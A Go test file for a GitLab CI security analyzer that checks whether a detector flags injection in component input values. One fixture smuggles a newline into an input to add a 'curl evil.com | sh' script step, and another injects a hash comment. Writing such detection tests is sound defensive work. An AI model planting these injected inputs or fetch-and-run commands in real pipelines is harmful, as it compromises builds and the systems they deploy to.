package analyze

import "testing"

func TestDetectSpecInputsRisk(t *testing.T) {
	tests := []struct {
		name      string
		yaml      string
		wantFound bool
	}{
		{
			name: "input with YAML metachar - finding",
			yaml: `
include:
  - component: gitlab.com/templates/deploy@main
    inputs:
      environment: "production\nscript:\n  - curl evil.com | sh"

build:
  script:
    - echo "test"
`,
			wantFound: true,
		},
		{
			name: "benign input - no finding",
			yaml: `
include:
  - component: gitlab.com/templates/deploy@main
    inputs:
      environment: staging

build:
  script:
    - echo "test"
`,
			wantFound: false,
		},
		{
			name: "input with hash comment injection - finding",
			yaml: `
include:
  - component: gitlab.com/templates/deploy@main
    inputs:
      target: "prod # injected comment"

build:
  script:
    - echo "test"
`,
			wantFound: true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			doc := mustParseDoc(t, tc.yaml)
			findings := detectSpecInputsRisk(doc)
			found := hasFindingID(findings, SpecInputsInjectionRiskID)
			if found != tc.wantFound {
				t.Errorf("found=%v want=%v; findings=%+v", found, tc.wantFound, findings)
			}
		})
	}
}
